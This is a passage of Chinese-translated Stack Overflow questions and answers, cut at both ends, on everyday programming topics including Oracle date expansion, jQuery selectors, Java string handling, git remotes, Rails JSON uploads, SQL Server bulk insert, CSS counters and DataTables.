    TO_CHAR(A.END_DATE,'MM/DD/YYYY') END_DATE
FROM table1 A
     cross join (select rownum r
                   from (select max(end_date-start_date) d from table1)
                  connect by level-1 <= d) b
 where A.START_DATE+(b.r-1) <= A.END_DATE
 order by 1, 2; 
```

即隔离连接到子查询，然后过滤掉 individual_day > end_date 的行。

但我不会推荐这种方法。与模型方法相比，它的性能会更差（特别是如果范围变大）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-14T17:33:16.840

不求分数。找到你的帖子，无聊地做这个......

我的测试表：

```
EMPNO    ENAME    START_DATE    END_DATE
------------------------------------------
7369     SMITH    6/1/2011      6/7/2011
7499     ALLEN    7/1/2011      7/3/2011

SELECT ename, ind_start_date
  FROM
  (
   SELECT distinct ename
        , start_date
        , to_char(start_date + (LEVEL-1), 'MM/DD/YYYY') ind_start_date
        , to_char(end_date, 'MM/DD/YYYY') end_date
    FROM emp_test
   WHERE ename IN ('SMITH', 'ALLEN')
  CONNECT BY LEVEL <= (end_date-start_date)+1
  ORDER BY ename
 )
 /

ENAME    IND_START_DATE
--------------------------
ALLEN    07/01/2011
ALLEN    07/02/2011
ALLEN    07/03/2011
SMITH    06/01/2011
SMITH    06/02/2011
SMITH    06/03/2011
SMITH    06/04/2011
SMITH    06/05/2011
SMITH    06/06/2011
SMITH    06/07/2011 
```

把事情简单化...

# c# - 在 ASP.NET MVC3 中将模型发布回控制器

> ID：14469655
> 
> 赞同：0
> 
> 时间：2013-01-22T23:01:17.157
> 
> 标签：c#, asp.net-mvc-3, forms

我正在尝试将模型发布回控制器，但由于某种原因，控制器总是返回 NULL。我知道我在做一些明显错误的事情。它是什么？

但是，如果我从该模型发回特定属性，它就可以正常工作。

控制器：

```
[HttpPost]
        public void MyAction(Company company)
        {
            System.Diagnostics.Debug.WriteLine("STUFF:" + company.dbName);
            if(company.CompanyOptions!=null)foreach (var item in company.CompanyOptions.CompanyLicenseOptions.CompanyLicenseOptionsList) System.Diagnostics.Debug.WriteLine("STUFF:" + item);
            else System.Diagnostics.Debug.WriteLine("STUFF IS NULL");
        } 
```

看法：

```
@model Domain.Entities.Company
    @using (Html.BeginForm("MyAction", "Controller", FormMethod.Post))
    {
        foreach (var licensedFeature in Model.CompanyOptions.CompanyLicenseOptions.CompanyLicenseOptionsList)
        {
            @Html.CheckBox(licensedFeature.LicenseName, licensedFeature.IsLicensed, checkboxHtmlAttributes);
            @licensedFeature.LicenseName                                                                                          
        } 
        <input type="hidden" name="company" value="@Model"/>
        <input id="submit_licenses" type="submit" style="display:none;" />
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T23:04:39.643

`@Model`似乎是一种复杂类型，因此您不能分配给作为输入字段的值。

您可以做的最好的事情是使用 an`@Html.EditorFor`为模型生成所需的 html 字段，这将确保将它们作为 Company 对象回发。

替换这个

```
<input type="hidden" name="company" value="@Model"/> 
```

和

```
@Html.EditorFor(model => model) 
```

# jquery - Jquery在div中选择特定图像

> ID：14469657
> 
> 赞同：0
> 
> 时间：2013-01-22T23:01:37.797
> 
> 标签：jquery, html

我在一个 div 中有多个图像

```
<div>
<li>
<img src="" class="avaliable_image">
</li>
<img src="" class="magnify">

</div> 
```

我正在尝试使用 Jquery 完全删除具有类名的图像`avaliable_image`，

```
 $(this).find('img').attr('class' ,'avaliable_image').remove(); 
```

但是，它会删除两个图像而不是一个？我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T23:02:59.453

```
$(this).find('img.avaliable_image').remove(); 
```

请参阅[类选择器参考](http://api.jquery.com/class-selector/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T23:05:54.820

您的使用`.attr('class' ,'avaliable_image')`实际上只是尝试在两个图像上设置类属性的值（都通过 匹配`.find('img')`），然后您的链接`.remove()`仍然会作用于两个图像。

你要

```
$(this).find('img.available_image').remove(); 
```

而是（注意在 中使用 CSS 选择器规则`find`）。

# java - 按位运算符 - 精度

> ID：14469662
> 
> 赞同：1
> 
> 时间：2013-01-22T23:01:52.420
> 
> 标签：java, logic, bit-manipulation

我似乎坚持的三个问题：

1.  为什么代码`x & ~077`比这行代码好`x & 0177700`。会不会是因为精度损失较少？

2.  为什么此代码在数字中设置第 5 位不正确？ `num = num + 0x20` 是不是因为我们需要使用逻辑或，`|`而不是`+`？

3.  为什么这段代码`x & 0xFF`比这行代码好`(x << 24) >> 24`？正确的表达式可能会导致更改原始 int 的符号扩展。从我所做的示例中，我确信这是正确的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T23:08:11.787

> 1、为什么这行代码x&~077比这行代码x&0177700好。

因为在第二个中，您对 x 的整数类型的长度进行了假设

> 2，为什么这个代码设置数字中的第5位不正确？num = num + 0x20 会不会是因为我们需要使用逻辑或 | 而不是 +？

是的！他们是不同的运营商。

# java - 计算字符串中的空格

> ID：14469663
> 
> 赞同：0
> 
> 时间：2013-01-22T22:29:27.233
> 
> 标签：java, comparison, string

我想计算字符串中的空格：

```
public class SongApp {
    public static void main(String[] args) {
        String word = "a b c";

        int i =0,spaceCount=0;

        while(i<word.length()){

            char temp = word.charAt(i);         
            System.out.println(temp);
            if(" ".equals(temp)){
                spaceCount++;
            }
            i++;            
        }
        System.out.println("Spaces in string: "+spaceCount);
    }
} 
```

当我用 替换 if 语句时`if(temp.equals(" "))`，我在原始类型 char 上得到一个“无法调用（字符串）”。

我不明白为什么这行不通。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-22T22:50:30.873

它不起作用，因为您正在对原始类型'char'的值调用Class String（equals（））的方法。您正在尝试将“char”与“String”进行比较。

您必须在 'char' 之间进行比较，因为它是一个原始值，您需要使用 '==' 布尔比较运算符，例如：

```
public class SongApp {

    public static void main(String[] args) {

      String word = "a b c";
      int i = 0,
      spaceCount = 0;

      while( i < word.length() ){
        if( word.charAt(i) == ' ' ) {
            spaceCount++;
        }
        i++;
      }

      System.out.println("Spaces in string: "+spaceCount);
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T23:26:14.750

您可以使用字符串的替换函数来替换所有空格（“”）而不是空格（“”），并获取调用替换函数之前和之后的长度之间的差异。通过这个例子：

```
class Test{

    public static void main(String args[]){

        String s1 = "a b c";
        int s1_length = s1.length();
        System.out.println(s1_length); // 5

        String s2 = s1.replace(" ",""); 
        int s2_length = s2.length();
        System.out.println(s2_length); // 3

        System.out.println("No of spaces = " + (s1_length-s2_length)); // No of spaces = 2
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-23T09:15:48.173

您可以使用 commons-lang.jar 来计算它。

`公共类主要{

```
public static void main(String[] args) {
    String word = "a b c";
    System.out.println("Spaces in string: " + StringUtils.countMatches(word," "));
} 
```

}`

“StringUtils.countMatches”的来源如下：

```
public static int countMatches(String str, String sub) {
    if (isEmpty(str) || isEmpty(sub)) {
        return 0;
    }
    int count = 0;
    int idx = 0;
    while ((idx = str.indexOf(sub, idx)) != INDEX_NOT_FOUND) {
        count++;
        idx += sub.length();
    }
    return count;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-08T21:12:26.503

公共类 CountSpace {

```
public static void main(String[] args) {

    String word = "a b c";
    String data[];int k=0;
    data=word.split("");
    for(int i=0;i<data.length;i++){
        if(data[i].equals(" ")){
            k++;
        }

    }
    System.out.println(k);

} 
```

}

# git - 如何从 github 中的不同分支合并

> ID：14469665
> 
> 赞同：2
> 
> 时间：2013-01-22T23:01:56.303
> 
> 标签：git, github

假设github中有一个项目“A”。我分叉了我正在处理的项目 B (A->B)。有人从 A (A->C) 创建了项目 C。有一些从 C 到 A 的拉取请求，但尚未合并。

如何将 C 的更改合并到我的 (B) 中？我确实有 C 的提交哈希。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T23:04:16.070

您可以要求所有者`C`向您发送拉取请求，或者更简单的是，您可以将他的存储库添加为远程，获取他的分支并合并您想要的所有内容。

简而言之，例如：

```
$ git remote add C_repo path/to/C/repo
$ git fetch C_repo
$ git merge C_repo/master 
```

[Github 教程](https://help.github.com/articles/syncing-a-fork)也可用。

# c# - 使用 javascript / jquery 即时计算两个值

> ID：14469669
> 
> 赞同：1
> 
> 时间：2013-01-22T23:02:31.240
> 
> 标签：c#, javascript, jquery, asp.net, webforms

我有两个控件，文本框和下拉菜单，我想在单击 asp 按钮时计算这两个字段的总和。这就是我所拥有的：下拉值

```
<asp:DropDownList ID="DropDownList3" runat="server" CssClass="dropdown" Width="74px">
  <asp:ListItem Text="1" Value="1" />
  <asp:ListItem Text="4" Value="4" />
  <asp:ListItem Text="5" Value="5" />
  <asp:ListItem Text="9" Value="9" />
  <asp:ListItem Text="10" Value="10" />
  <asp:ListItem Text="11" Value="11" />
  <asp:ListItem Text="12" Value="12" />
  <asp:ListItem Text="13" Value="13" />
</asp:DropDownList> 
```

文本框值

```
<asp:TextBox ID="TextBox9" runat="server" CssClass="input-mini" /><br />
<asp:Button ID="Button3" runat="server" Text="Calculate Sum" CssClass="btn btn-minibtn-info" />
Textbox Result <asp:TextBox ID="TextBox10" runat="server" CssClass="input-mini" /> 
```

我想单击按钮来计算下拉列表 + textbox9 的总和，然后将值放入 TextBox10 中。知道如何实现吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-22T23:07:16.083

注册到客户点击：

```
<asp:Button OnClientClick="return ButtonClick();" ... /> 
```

JS：

```
function ButtonClick() {
    var ddlVal = parseInt($('#<%=DropDownList3.ClientID%>').val());
    var tb9Val = parseInt($('#<%=TextBox9.ClientID%>').val());
    $('#<%=TextBox10.ClientID%>').val(ddlVal + tb9Val);

    return false;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T23:24:06.483

```
$(function() {
            $("#<%=Button3.ClientID%>").click(function() {
            var a = parseInt($('#<%=TextBox9.ClientID%>').val());
            var b = parseInt($('#<%=DropDownList3.ClientID%>').val());
            $('#<%=TextBox10.ClientID%>').val(a + b);
            });
        }); 
```

# ruby-on-rails - 在 Ruby/Rails 上发布带有文件内容的 JSON

> ID：14469680
> 
> 赞同：2
> 
> 时间：2013-01-22T23:03:02.307
> 
> 标签：ruby-on-rails, ruby, json, post, attachment

有谁知道如何将 JSON 发布到带有附加文件的 Rails 服务器？内容会被base64编码吗？多部分？老实说，我不知道，也没有真正找到任何可以帮助的东西。想法是让客户端将 JSON 发布到带有附加文件的 Rails API，并让 Rails（带有回形针将是完美的）获取 JSON 并正确保存文件。提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-24T02:29:32.247

这是我解决这个问题的方法。首先，我创建了一个 rake 任务来上传 json 内容中的文件：

```
desc "Tests JSON uploads with attached files on multipart formats"
task :picture => :environment do
    file = File.open(Rails.root.join('lib', 'assets', 'photo.jpg'))

    data = {title: "Something", description: "Else", file_content: Base64.encode64(file.read)}.to_json
    req = Net::HTTP::Post.new("/users.json", {"Content-Type" => "application/json", 'Accept' => '*/*'})
    req.body = data

    response = Net::HTTP.new("localhost", "3000").start {|http| http.request(req) }
    puts response.body
  end 
```

然后在我的 rails 应用程序的控制器/模型上得到它，如下所示：

```
params[:user] = JSON.parse(request.body.read)

...

class User < ActiveRecord::Base
  ...

    has_attached_file :picture, formats: {medium: "300x300#", thumb: "100#100"}

    def file_content=(c)
      filename = "#{Time.now.to_f.to_s.gsub('.', '_')}.jpg"
      File.open("/tmp/#{filename}", 'wb') {|f| f.write(Base64.decode64(c).strip) }
      self.picture = File.open("/tmp/#{filename}", 'r')
    end
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-23T14:05:21.473

JSON 是一种数据序列化格式。没有将数据或文件作为序列化对象中的数据上传的标准模式。JSON 期望数据字段将是基本对象，因此您可能希望使用文件的 Base64 编码将其转换为字符串。

您可以随意定义您的结构，处理它是您的责任。

# python - Google App Engine 本地（开发）IPython Shell

> ID：14469685
> 
> 赞同：8
> 
> 时间：2013-01-22T23:03:27.047
> 
> 标签：python, google-app-engine, ipython

在我本地的 Google 应用引擎开发环境中，我想使用 ipython shell，尤其是能够检查带有通过 创建的数据的模型`dev_server.py`，非常类似于 django 的`manage.py shell`命令的工作方式。

（这意味着应该在`sys.path`修复并`app.yaml`读取和分析后启动ipython shell，并且本地数据存储已准备好）

有什么简单的解决方案吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-23T08:26:36.493

对于初学者，您可以将应用程序根目录和 SDK 根目录 ( `google_appengine`) 放在 Python 路径中。您还需要一些库，例如`yaml`，安装或添加到 SDK`lib`目录中的库路径。然后您可以导入模块并调用一些功能。

```
>>> import sys
>>> sys.path.append('/Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine') 
```

当然，只要代码路径尝试进行服务调用，库就会引发异常，说它没有绑定到任何东西。要将服务库绑定到测试存根，请使用 testbed 库：

```
>>> from google.appengine.ext import testbed
>>> tb = testbed.Testbed()
>>> tb.activate()
>>> tb.init_datastore_v3_stub()
>>> from google.appengine.ext import db
>>> import models
>>> m = models.Entry()
>>> m.title = ‘Test’
>>> m.put() 
```

要告诉数据存储测试存根使用您的开发服务器的数据存储文件，请将文件的路径`init_datastore_v3_stub()`作为`datastore_file`参数传递给。有关详细信息，请参阅方法的文档注释`google.appengine.ext.testbed`。

有关测试平台的更多信息：[https ://developers.google.com/appengine/docs/python/tools/localunittesting](https://developers.google.com/appengine/docs/python/tools/localunittesting)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-24T16:13:22.117

基本上你需要使用这个：[https ://developers.google.com/appengine/articles/remote_api](https://developers.google.com/appengine/articles/remote_api)

对于 IPython 支持，您有两种选择：

(1) 如果您使用的是 Python 2.7（和 IPython 0.13），则需要使用它来嵌入 IPython shell：

```
from IPython.frontend.terminal.interactiveshell import TerminalInteractiveShell
shell = TerminalInteractiveShell(user_ns=namespace)
shell.mainloop() 
```

(2) 如果您使用的是 Python 2.5（和 IPython 0.10.2），则需要使用这一行来嵌入 IPython shell：

```
from IPython.Shell import IPShellEmbed
ipshell = IPShellEmbed(user_ns=namespace, banner=banner)
ipshell() 
```

这是我使用的一个：[https](https://gist.github.com/4624108) ://gist.github.com/4624108所以你只需输入..

```
>> python console.py your-app-id 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-11-19T06:42:31.693

一旦你运行**dev_appserver.py** 你会得到

```
starting module "default" running at: http://127.0.0.1:8080
Starting admin server at : http://localhost:8000 
```

所以基本上你想要做的是访问 [http://localhost:8000](http://localhost:8000)并且在那里你会发现“交互式控制台”你可以用它来玩

# sql-server - 带有 FOREIGN KEY 参数的 SQL Server 批量插入（txt 文件中不存在，包括 ERD）

> ID：14469688
> 
> 赞同：0
> 
> 时间：2013-01-22T23:03:33.460
> 
> 标签：sql-server, bulkinsert, erd

好的，所以我有一个像这样设计的表 ERD……用于常规批量插入

[![customer_table_to_customer_stg](../Images/191953e24d04c906582b59f6b37d48e0.png)](https://i.stack.imgur.com/P7Mnc.png)
[（来源：[iforce.co.nz](http://iforce.co.nz/i/stlfnt1q.pac.png)）]

以及一个制表符分隔的`\t`文本文件，其中包含有关每个客户的信息（包含大约 100,000 多条记录）。

```
# columnA columnB columnC
data_pointA data_pointB data_pointC 
```

以及当前可以正常完成预期工作的存储过程。

```
CREATE PROCEDURE import_customer_from_txt_para @filelocation varchar(100)
AS BEGIN

    TRUNCATE TABLE dbo.[customer_stg]
    DECLARE @sql nvarchar(4000) = '
    BULK INSERT customer_stg
    FROM ''' + @filelocation + '''
    WITH
    (
        FIRSTROW=14,
        FIELDTERMINATOR=''\t'',
        ROWTERMINATOR=''\n''
    )';
    print @sql;
    exec(@sql);

END 
```

但我的问题是关于是否可以在批量插入中包含 customer_id之间`customer_table`的关系？像这样？（我不确定如何将外键参数应用于批量插入）。`customer_stg``customer_stg``@customer_sk`

```
CREATE PROCEDURE import_customer_from_txt_para @filelocation varchar(100), @customer_sk int
AS BEGIN

    TRUNCATE TABLE dbo.[customer_stg]
    DECLARE @sql nvarchar(4000) = '
    BULK INSERT customer_stg
    FROM ''' + @filelocation + '''
    WITH
    (
        FIRSTROW=14,
        FIELDTERMINATOR=''\t'',
        ROWTERMINATOR=''\n''
    )';
    print @sql;
    exec(@sql);

END 
```

最好在每次批量插入之后，我希望能够关联两个表之间的数据。

[![customer_table_to_customer_stg_RS](../Images/08b8f75765dd8c0e67cf1fd4558545f7.png)](https://i.stack.imgur.com/3Oybb.png)
[（来源：[iforce.co.nz](http://iforce.co.nz/i/04znl02v.rts.png)）]

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-23T00:21:09.597

批量插入将插入 NULL 或未指定列的默认值（基于 KEEPNULLS 参数），假设您有（或将创建）约束，这当然不适用于您的情况。我认为是这种情况，否则您可以在运行插入后直接更新表。

我看到了两种解决方法：
- 如果您有能力，您可以在运行批量插入之前对文本文件进行宏编辑。因为我假设这不是问题...
- 首先，如果 FK 列不存在，您需要将其添加到您的 _stg 表中。然后，在您的存储过程中，使用输入文件中指定的三列创建一个临时表：

```
CREATE TABLE dbo.#Temp_STG
(
    columnA,
    columnB,
    columnC
) 
```

然后，批量插入该表。然后您可以从临时表插入到主 _stg 表，但添加一列：

```
INSERT dbo.Customer_STG
SELECT
    T.columnA,
    T.columnB,
    T.columnC,
    [your customer key]
FROM dbo.#Temp_STG AS T 
```

完成后确保放下临时表。

附带说明一下，您是否需要为此任务使用动态 SQL？除非绝对必要，否则通常最好避免。

我想另一种选择是将列的默认值设置为您想要的任何值，然后关闭 KEEPNULLS。但是，当您可以使用上述解决方案时，我绝对不建议您这样做。

查看更多：http: [//msdn.microsoft.com/en-us/library/ms188365.aspx](http://msdn.microsoft.com/en-us/library/ms188365.aspx)

# css - 如何在不重置计数器的情况下在列表中使用 CSS 计数器？

> ID：14469689
> 
> 赞同：8
> 
> 时间：2013-01-22T19:27:58.490
> 
> 标签：css

我想要多个“ol”列表，其中计数器值不会*在*列表之间重置。另一种说法是，我希望第二个列表中第一个“li”的计数器比前一个列表中最后一个元素的计数器值高一个。是否有一些 CSS 魔法可以做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2016-05-02T15:46:41.813

虽然[苏的回答](https://stackoverflow.com/a/14469691/167889)会奏效，但您不必如此严厉。只需重置顶部的计数器，在您使用它的任何地方，它都会增加。

```
body {
  counter-reset: item;
}

li {
  display: block;
}

li:before {
  display: inline-block;
  content: counter(item) ". ";
  counter-increment: item;
} 
```

看这个[例子](https://jsfiddle.net/e5tr8nb7/1/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-22T22:35:22.390

不完全是 CSS。它确实为您提供了[对计数器的一些控制](https://developer.mozilla.org/en-US/docs/CSS/Counters?redirectlocale=en-US&redirectslug=counters)（并且[支持非常好](http://caniuse.com/css-counters)），但它的行为仍然是静态的。所以这有效：

```
<html>
<head>
<style>
    #list-one { 
        counter-reset : item;
    }
    #list-two { 
        counter-reset : item 3;
    }
    li {
        display : block;
    }
    li:before {
        display : inline-block;
        content : counter(item) ". ";
        counter-increment : item;
    }
</style>
</head>
<body>
    <ol id="list-one">
        <li>One</li><li>Two</li><li>Three</li>
    </ol>
    <ol id="list-two">
        <li>Four</li><li>Five</li><li>Six</li>
    </ol>
</body>
</html> 
```

…但是你不能只是一个接一个地删除两个列表，然后让第二个*自动*从另一个停止的地方开始（参见第二个 CSS 规则中的“3”）。不过，只要有一点创意，您就可以`counter-reset`用一点 PHP 或任何您用来构建网站的东西来包装样式。当然，这取决于您的具体情况。

# android - Android：图片库的捕捉效果

> ID：14469693
> 
> 赞同：1
> 
> 时间：2013-01-22T23:03:48.847
> 
> 标签：android, gallery, snapping

在我的应用程序的一部分中，我正在尝试制作一个您可以浏览的照片库。我想要一个类似于 Gallery 类的捕捉效果。我希望每次您从列表中的一个图像滑动到下一个图像时它都具有捕捉效果。这类似于图库应用程序，您可以在其中浏览照片，或者在您的应用程序库中轻扫谁。每次刷卡都有“啪啪”的效果。最简单的方法是什么？

我知道在较新的 Android API 中不推荐使用 Gallery，所以这是不可能的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T23:07:15.260

你想要 ViewPager。它包含在兼容性包中，并在[此 Android 开发人员博客文章](http://android-developers.blogspot.com/2011/08/horizontal-view-swiping-with-viewpager.html)中进行了描述。

# cakephp - cakephp cakedc 之间

> ID：14469694
> 
> 赞同：1
> 
> 时间：2013-01-22T23:03:49.577
> 
> 标签：cakephp, cakedc

我想使用 cakedc 中的“介于”示例，但无法理解。

```
'range' => array('type' => 'expression', 'method' => 'makeRangeCondition', 'field' => 'Article.views BETWEEN ? AND ?'), 
```

我的表中有字段 qca_start 并希望用户提供两个值（从，到）并在从和到之间搜索 qca_start。

我的控制器：（我使用其他更简单的搜索没有问题。（employee_id 在这里工作得很好）

```
public $presetVars = array(
    array('field' => 'employee_id', 'type' => 'value'),
    array('field' => 'qca_start', 'type' => 'value') // not sure what type to use here for between search. 
```

}; 我表上的字段是 qca_start，而不是用户我将如何为此命名 presetVar？

在我的模型上

```
public $filterArgs = array(
array('name' => 'employee_id', 'type' => 'value'),
    'range' => array('type' => 'expression', 'method' => 'makeRangeCondition', 'field' => 'Article.views BETWEEN ? AND ?'), 
```

);

我不知道如何为 filterArgs 格式化：

```
'range' => array('type' => 'expression', 'method' => 'makeRangeCondition', 'field' => 'Article.views BETWEEN ? AND ?'), 
```

我希望 qca_start 介于搜索值一和二之间。

你能帮我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T21:41:47.870

从我给[@CakeDC Plugin Search Between Dates的答案中复制/粘贴](https://stackoverflow.com/questions/15098172/cakedc-plugin-search-between-dates)

在模型中：

```
 'creationDateBetween'       => array(
            'type'      => 'expression',
            'method'    => 'CreationDateRangeCondition',
            'field'     => 'MODEL.creationdate BETWEEN ? AND ?',
        ),

public function CreationDateRangeCondition($data = array()){
    if(strpos($data['creationDateBetween'], ' - ') !== false){
        $tmp = explode(' - ', $data['creationDateBetween']);
        $tmp[0] = $tmp[0]."-01-01";
        $tmp[1] = $tmp[1]."-12-31";
        return $tmp;
    }else{
        return array($data['creationDateBetween']."-01-01", $data['creationDateBetween']."-12-31");
    }
} 
```

在视图中：请注意，我使用的是年份范围的滑块

```
 echo $this->Form->input('creationDateBetween', 
    array(
        'label'     => __('Creation date between X and Y'),
        'div'       => false,
        'style' => 'border: 0; color: #49AFCD; font-weight: bold;'
    )
);

?><div id="creationDateBetweenSlider" style="padding:0;"></div><?php 
```

* * *

```
<script>
$(function() {

    var     creationDateBetweenSlider = $( "#creationDateBetweenSlider" ),
        institutionCreationDateBetween  = $( "#MODELCreationDateBetween" ), 

lock = 0;

creationDateBetweenSlider.slider({
                range: true,
                min: 1900,
                max: 2050,
                values: [ 2000, 2013 ],
                slide: function( event, ui ) {
                    MODELCreationDateBetween.val(  ui.values[ 0 ] + " - " + ui.values[ 1 ] );
                }
            });
        if(lock != 0) MODELCreationDateBetween.val( creationDateBetweenSlider.slider( "values", 0 ) + " - " + creationDateBetweenSlider.slider( "values", 1 ) );

lock = 1;

    });
</script> 
```

等待反馈，看看它是否适合你；）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-23T09:01:54.987

您应该阅读文档@ [https://github.com/cakedc/search](https://github.com/cakedc/search)

> 如果您想添加将由某种方法生成的条件，“表达式”类型很有用，并且条件字段包含几个参数，就像前面用于“范围”的示例一样。这里的字段包含 'Article.views BETWEEN ? 和 ？' 和**Article::makeRangeCondition 返回两个值的数组**。

因此，只需在您的方法中返回 2 个值：

```
public function makeRangeCondition() {
    ...
    return array($from, $to);
} 
```

他们会自动替换这两个？然后按这个顺序。

# objective-c - 如何从 JSONValue 的 NSDictionary 中获取 pickerView 的值？

> ID：14469695
> 
> 赞同：-1
> 
> 时间：2013-01-22T23:03:51.637
> 
> 标签：objective-c, nsdictionary, uipickerview

在我的代码中，我使用 JSONValue 来获取 NSDictionary。

字典看起来像这样：

```
{
   {ID = 0, NAME = "Patrick"},
   {ID = 1, NAME = "Ted"},
   {ID = 2, NAME = "John"},
   {ID = 3, NAME = "Allen"},
   {ID = 4, NAME = "David"}
} 
```

我想在下面的委托函数中返回对应 ID 的名称：

```
- (NSString *)pickerView:(UIPickerView *)pickerView titleForRow:(NSInteger)row forComponent:(NSInteger)component 
```

最有效的方法是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T23:06:49.140

例如：

```
- (NSString *)pickerView:(UIPickerView *)pickerView titleForRow:(NSInteger)row forComponent:(NSInteger)component
{
    // Assuming that you have just one component
    return [jsonDict[row] objectForKey: @(row) ];
} 
```

# javascript - 使用 jQuery 删除所有数据表

> ID：14469699
> 
> 赞同：4
> 
> 时间：2013-01-22T23:04:35.797
> 
> 标签：javascript, jquery, html, datatables

因此，我将数据表与 jQuery 一起使用，并且对于为什么这不起作用感到有些困惑。我的 HTML 如下所示：

```
<table id="surnamePrimaryPartitionTable" border=1 class="display partitionDisplay">
  <caption>Partitions</caption>
  <thead>
    <tr style="background-color: #afeeee;">
      <th>Partition</th>
      <th>CPU %</th>
      <th>Search Count</th>
      <th>Person Count</th>
      <th>Disk Space</th>
    </tr>
  </thead>
  <tbody>
  </tbody>
</table> 
```

我有几个表，每个表都遵循类似的格式，每个表都使用 partitionDisplay 类（实际上只是我使用的一个类，以便以后可以使用 jQuery 选择所有表）。

因此，当我尝试销毁数据表时，问题就出现了。这是我所拥有的：

```
function DeletePartitionInformation(data) {
  jQuery(".partitionDisplay").each(function(){
    jQuery(this).dataTable().fnDestroy();
  });
  jQuery("table tbody").each(function() {
    jQuery(this).html("");
  })
} 
```

此代码似乎适用于第一个表，但会引发异常并且不适用于任何后续表。我收到的 javascript 错误消息如下：

未捕获的类型错误：无法读取未定义的属性“asSorting”

对这个错误的快速谷歌搜索表明它通常是由嵌套在标签中的元素引起的。然而，这似乎不是问题。我将发布其他三个表的代码来演示这一点：

```
<table id="surnamePrimarySubpartitionTable" border=1 class="display partitionDisplay">
  <caption>SubPartitions</caption>
  <thead>
    <tr style="background-color: #afeeee;">
      <th>Partition</th>
      <th>SubPartition</th>
      <th>CPU %</th>
      <th>Search Count</th>
      <th>Person Count</th>
      <th>Disk Space</th>
      <th>Begin</th>
      <th>End</th>
    </tr>
  </thead>
  <tbody>
  </tbody>
</table>

<table id="givenNullSurnamePartitionTable" border=1 class="display partitionDisplay">
  <caption>Partitions</caption>
  <thead>
    <tr style="background-color: #98fb98;">
      <th>Partition</th>
      <th>CPU %</th>
      <th>Search Count</th>
      <th>Person Count</th>
      <th>Disk Space</th>
    </tr>
  </thead>
  <tbody>
  </tbody>
</table>

<table id="givenNullSurnameSubpartitionTable" border=1 class="display partitionDisplay">
  <caption>SubPartitions</caption>
  <thead>
    <tr style="background-color: #98fb98;">
      <th>Partition</th>
      <th>SubPartition</th>
      <th>CPU %</th>
      <th>Search Count</th>
      <th>Person Count</th>
      <th>Disk Space</th>
      <th>Begin</th>
      <th>End</th>
  </tr>
  </thead>
  <tbody>
  </tbody>
</table> 
```

最后一点：如果我使用下面的代码，我实际上能够得到我想要的行为。但是，显然我不希望这样做，因为我真的很想循环遍历元素而不是硬编码元素 id 所在的位置。

```
function DeletePartitionInformation(data) {
  jQuery("#surnamePrimarySubpartitionTable").dataTable().fnDestroy();
  jQuery("#surnamePrimaryPartitionTable").dataTable().fnDestroy();
  jQuery("#givenNullSurnameSubpartitionTable").dataTable().fnDestroy();
  jQuery("#givenNullSurnamePartitionTable").dataTable().fnDestroy();

  jQuery("table tbody").each(function() {
      jQuery(this).html("");
  })
} 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-01-22T23:22:03.670

> 未捕获的类型错误：无法读取未定义的属性“asSorting”

这似乎表明它可能正在尝试销毁`dataTable`未创建的 s。

[静态`fnTables`](http://www.datatables.net/api#fnTables)`Array`应该只给你一个带有 a的`<table>`元素`dataTable`：

```
var tables = $.fn.dataTable.fnTables(true);

$(tables).each(function () {
    $(this).dataTable().fnDestroy();
}); 
```

# sorting - 排序和过滤后，如何重新选中剑道网格中的复选框？

> ID：14469704
> 
> 赞同：2
> 
> 时间：2013-01-22T23:04:44.763
> 
> 标签：sorting, grid, filtering, kendo-ui, checkbox

我在剑道网格中的每一行都有一个复选框。如果用户对网格进行排序或过滤，则从复选框中清除复选标记。在排序或过滤发生后，如何防止复选框取消选中或重新选中它们？请参考以下 js fiddle 观察排序过程中的行为：

[http://jsfiddle.net/e6shF/33/](http://jsfiddle.net/e6shF/33/)

这是 jsfiddle 上的代码供参考（......需要问这个问题）：

```
$('#grid').kendoGrid({
    dataSource: { data: [{id:3, test:'row check box will unchecked upon sorting'}]},
    sortable: true,
    columns:[
{
    field:'<input id="masterCheck" class="check" type="checkbox" /><label for="masterCheck"></label>', 
    template: '<input id="${id}" type="checkbox" />',
    filterable: false,
    width: 33,
    sortable: false // may want to make this sortable later. will need to build a custom sorter.
},
    {field: 'test',
     sortable: true}
]}); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-22T23:29:33.120

基本上每次都会清除选择，因为重新绘制了网格。您可以将检查项目存储在数组或对象中，当重绘 Grid（dataBound 事件）时，您可以再次将它们标记为已检查。

为了简化这里的事情是你的代码的更新版本。还可以使用 headerTemplate 选项来设置标题模板 - 不要将您的字段命名为模板。

```
var array = {};
$('#grid').kendoGrid({
    dataSource: { data: [{id:3, test:'row check box will unchecked upon sorting'}]},
    sortable: true,
    dataBound:function(){
        for(f in array){
            if(array[f]){
                $('#'+f).attr('checked','checked');
            }
        }
    },
